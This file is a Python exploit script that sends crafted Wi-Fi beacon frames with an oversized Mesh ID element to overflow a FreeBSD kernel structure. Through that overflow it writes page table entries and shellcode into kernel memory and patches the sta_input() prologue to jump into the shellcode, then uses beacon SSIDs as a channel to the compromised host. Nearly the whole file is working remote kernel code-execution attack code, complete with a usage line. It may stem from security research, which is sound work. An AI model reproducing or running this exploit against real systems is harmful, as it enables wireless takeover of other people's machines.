#!/usr/bin/env python3

from scapy.all import (Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp)
from elftools.elf.elffile import ELFFile
from random import randrange
import time
import struct
import sys
import x86

INTERFACE = None
SENDER_ADDRESS = 'AA:BB:CC:DD:EE:FF'

# ------------------------------------------------------------------------------

#
# FreeBSD constants.
#

DMAP_BASE = 0xFFFFF80000000000
KERNBASE  = 0xffffffff80000000

#
# The length of the MeshId option. After that length there are the 'data' and
# 'len' fields that we overflow into.
#

MESH_OVERFLOW_LEN =  32  # se_meshid[2+IEEE80211_MESHID_LEN]
MESH_OVERFLOW_LEN += 2   # adjust
MESH_OVERFLOW_LEN += 136 # offsetof(struct ieee80211_ies, data)

#
# Patch information. Initialized dynamically.
#

PATCH_ADDR = 0
PHYS_PATCH_ADDR = 0
PHYS_PATCH_OFF = 0

#
# The values of the PTEs we write. Initialized dynamically.
#

L3_PTE = 0
L2_PTE = 0
L1_PTE_PATCH_1 = 0
L1_PTE_PATCH_2 = 0
L1_PTE_PAGE1 = 0

def InitPatchConstants(patch_addr):
	global PATCH_ADDR
	global PHYS_PATCH_ADDR
	global PHYS_PATCH_OFF
	global L3_PTE
	global L2_PTE
	global L1_PTE_PATCH_1
	global L1_PTE_PATCH_2
	global L1_PTE_PAGE1

	# Withdraw 6 bytes, which are the NOP sequence before sta_input().
	PATCH_ADDR = patch_addr - 6

	PHYS_PATCH_ADDR = (PATCH_ADDR - KERNBASE) & ~0xFFF
	PHYS_PATCH_OFF = (PATCH_ADDR - KERNBASE) & 0xFFF

	# 0b11 = Write | Present
	L3_PTE = 0x1000 | 0b11
	L2_PTE = 0x1000 | 0b11
	L1_PTE_PATCH_1 = PHYS_PATCH_ADDR | 0b11
	L1_PTE_PATCH_2 = (PHYS_PATCH_ADDR + 0x1000) | 0b11
	L1_PTE_PAGE1 = 0x1000 | 0b11

# ------------------------------------------------------------------------------

def SendDot11(Mesh, MeshLen):
	# RadioTap layer
	packet = RadioTap()
	# Dot11 layer
	packet /= Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=SENDER_ADDRESS, addr3=SENDER_ADDRESS)
	# Beacon
	packet /= Dot11Beacon(cap='ESS')
	# SSID option -- empty (2 bytes)
	packet /= Dot11Elt(ID='SSID',info='')
	# Rates option -- empty (2 bytes)
	packet /= Dot11Elt(ID='Rates', info='')
	# Mesh option
	packet /= Dot11Elt(ID=114, info=Mesh, len=MeshLen)
	# Send
	sendp(packet, iface=INTERFACE, verbose=False)

def SendPrint(Seq, Message):
	SSID = Seq.to_bytes(8, byteorder='little')
	SSID += str.encode(Message)

	# RadioTap layer
	packet = RadioTap()
	# Dot11 layer
	packet /= Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=SENDER_ADDRESS, addr3='00:AA:B0:0B:D1:CC')
	# Beacon
	packet /= Dot11Beacon(cap='ESS')
	# SSID option -- empty (2 bytes)
	packet /= Dot11Elt(ID='SSID', info=SSID, len=len(SSID))
	# Rates option -- empty (2 bytes)
	packet /= Dot11Elt(ID='Rates', info='')
	# Send
	sendp(packet, iface=INTERFACE, verbose=False)

# ------------------------------------------------------------------------------

def Phase1_WritePageOne(ShellcodeBytes):
	MeshLen = MESH_OVERFLOW_LEN

	# Pad to get to offset 0x8 from the beginning of the buffer.
	Mesh = b'\x01\x02'

	# Write the PTEs.
	Mesh += L2_PTE.to_bytes(8, byteorder='little')         # L2 = 1
	Mesh += L1_PTE_PATCH_1.to_bytes(8, byteorder='little') # L1 = 2
	Mesh += L1_PTE_PATCH_2.to_bytes(8, byteorder='little') # L1 = 3
	Mesh += L1_PTE_PAGE1.to_bytes(8, byteorder='little')   # L1 = 4

	# Write our instructions. We are at offset 40 from the beginning of the
	# page. See Offset40 below.
	Mesh += ShellcodeBytes

	# Fill in the rest of the payload with garbage.
	if len(Mesh) > MeshLen:
		print("Shellcode too big to fit the packet: " + str(len(Mesh)) + " > " + str(MeshLen))
		sys.exit(1)
	Mesh += b'\x0A' * (MeshLen - len(Mesh))

	# Where we're going to write. This is is physaddr = 0x1000.
	AddrToWriteTo = DMAP_BASE + 0x1000

	# addr
	Mesh += AddrToWriteTo.to_bytes(8, byteorder='little')
	MeshLen += 8
	# len
	Mesh += (6 + MESH_OVERFLOW_LEN + 8 + 4).to_bytes(4, byteorder='little')
	MeshLen += 4

	SendDot11(Mesh, MeshLen)

def Phase2_WriteL3():
	MeshLen = MESH_OVERFLOW_LEN

	# Pad to get to offset 0x8 from the beginning of the buffer.
	Mesh = b'\x01\x02'

	# Write the PTE. This is used as L3.
	Mesh += L3_PTE.to_bytes(8, byteorder='little')

	# Fill in the rest of the payload with garbage.
	Mesh += b'\x0A' * (MeshLen - len(Mesh))

	# &L3_BASE[pl3_i(va)]
	AddrToWriteTo = x86.L3_BASE + x86.pl3_i(x86.KERN_L4_BASE) * 8

	# addr
	Mesh += AddrToWriteTo.to_bytes(8, byteorder='little')
	MeshLen += 8
	# len
	Mesh += (6 + MESH_OVERFLOW_LEN + 8 + 4).to_bytes(4, byteorder='little')
	MeshLen += 4

	SendDot11(Mesh, MeshLen)

def Phase3_PatchKernel(bytes):
	MeshLen = MESH_OVERFLOW_LEN

	# Instructions
	Mesh = bytes
	if len(Mesh) != MeshLen:
		print("[!] Internal error")
		sys.exit(1)

	AddrToWriteTo = (
		# L4 = 511
		x86.KERN_L4_BASE + \
		# L3 = 1
		1 * x86.NBPD_L3 + \
		# L2 = 1
		1 * x86.NBPD_L2 + \
		# L1 = 2
		2 * x86.NBPD_L1 + \
		# Offset within L1
		PHYS_PATCH_OFF
	)

	# addr
	Mesh += AddrToWriteTo.to_bytes(8, byteorder='little')
	MeshLen += 8
	# len
	Mesh += (6 + MESH_OVERFLOW_LEN + 8 + 4).to_bytes(4, byteorder='little')
	MeshLen += 4

	SendDot11(Mesh, MeshLen)

def Phase4_Repair():
	MeshLen = MESH_OVERFLOW_LEN

	Mesh = b''
	Mesh += b'\x00' * (MeshLen - len(Mesh))

	# addr
	Mesh += (0).to_bytes(8, byteorder='little')
	MeshLen += 8
	# len
	Mesh += (0).to_bytes(4, byteorder='little')
	MeshLen += 4

	SendDot11(Mesh, MeshLen)

# ------------------------------------------------------------------------------

def ApplyKernelPatch(bytes):

	#
	# We expect the first bytes to be:
	#
	#	55                   	push   %rbp
	#	48 89 e5             	mov    %rsp,%rbp
	#	41 57                	push   %r15
	#	41 56                	push   %r14
	#	41 55                	push   %r13
	#	41 54                	push   %r12
	#

	expected_bytes =  b"\x55"
	expected_bytes += b"\x48\x89\xE5"
	expected_bytes += b"\x41\x57"
	expected_bytes += b"\x41\x56"
	expected_bytes += b"\x41\x55"
	expected_bytes += b"\x41\x54"

	read_bytes = bytes[0:len(expected_bytes)]

	if read_bytes != expected_bytes:
		print("[!] Unexpected kernel prologue")
		sys.exit(1)

	#
	# We replace the kernel prologue by this:
	#
	#	48 b8 77 66 55 44 33 	movabs $0x11223344556677,%rax
	#	22 11 00
	#	ff d0                	callq   *%rax
	#

	# Shellcode page.
	AddressToJumpInto = (
		# L4 = 511
		x86.KERN_L4_BASE + \
		# L3 = 1
		1 * x86.NBPD_L3 + \
		# L2 = 1
		1 * x86.NBPD_L2 + \
		# L1 = 4
		4 * x86.NBPD_L1
	)
	# Offset40.
	AddressToJumpInto += 40

	new_bytes =  b"\x48\xb8"
	new_bytes += AddressToJumpInto.to_bytes(8, byteorder='little')
	new_bytes += b"\xff\xd0"

	if len(new_bytes) != len(expected_bytes):
		print("[!] Internal error")
		sys.exit(1)

	patched = new_bytes + bytes[len(expected_bytes):]

	if len(patched) != len(bytes):
		print("[!] Internal error")
		sys.exit(1)

	return patched

def PrepareKernelPatch(fname):
	elf = ELFFile(open(fname, 'rb'))

	# Find the symbol.
	symtab = elf.get_section_by_name('.symtab')
	if not symtab:
		print('No symbol table available!')
		sys.exit(1)
	sym = symtab.get_symbol_by_name("sta_input")[0]
	if not sym:
		print('Symbol not found')
		sys.exit(1)

	# Update the globals with the address.
	InitPatchConstants(sym['st_value'])

	file_offset = None
	for seg in elf.iter_segments():
		if seg.header['p_type'] != 'PT_LOAD':
			continue
		if sym['st_value'] >= seg['p_vaddr'] and sym['st_value'] < seg['p_vaddr'] + seg['p_filesz']:
			file_offset = sym['st_value'] - seg['p_vaddr'] + seg['p_offset']
			break

	if not file_offset:
		print('Error getting file offset from ELF data')
		sys.exit(1)

	elf.stream.seek(file_offset)
	bytes = elf.stream.read(MESH_OVERFLOW_LEN)

	bytes = ApplyKernelPatch(bytes)

	return bytes

def ReadShellcode(fname):
	f = open(fname, "rb")
	ShellcodeBytes = b''
	byte = f.read(1)
	ShellcodeBytes += byte
	while byte != b"":
		byte = f.read(1)
		ShellcodeBytes += byte
	return ShellcodeBytes

if __name__ == '__main__':
	if len(sys.argv) < 3:
		print("usage: ./exploit.py $interface $kernel {--already-patched}")
		sys.exit(1)
	INTERFACE = sys.argv[1]
	kernel = sys.argv[2]

	if len(sys.argv) == 3 or sys.argv[3] != "--already-patched":
		ShellcodeBytes = ReadShellcode("shellcode.bin")
		KernelStaInput = PrepareKernelPatch(kernel)
		print("[+] Phase 1: writing page1")
		for i in range(20):
			Phase1_WritePageOne(ShellcodeBytes)
			time.sleep(1/10.)
		time.sleep(1)
		print("[+] Phase 2: writing L3")
		for i in range(20):
			Phase2_WriteL3()
			time.sleep(1/10.)
		time.sleep(1)
		print("[+] Phase 3: patching kernel")
		for i in range(20):
			Phase3_PatchKernel(KernelStaInput)
			time.sleep(1/10.)
		time.sleep(1)
		print("[+] Phase 4: repairing")
		for i in range(20):
			Phase4_Repair()
			time.sleep(1/10.)
		time.sleep(1)
		print("[+] Finished")

	seq = randrange(0xFFFFFFFFFFFFFFFF)

	while True:
		msg = input("> ")
		msg += "\n"
		for i in range(20):
			SendPrint(seq, msg)
			time.sleep(1/10.)
		seq += 1

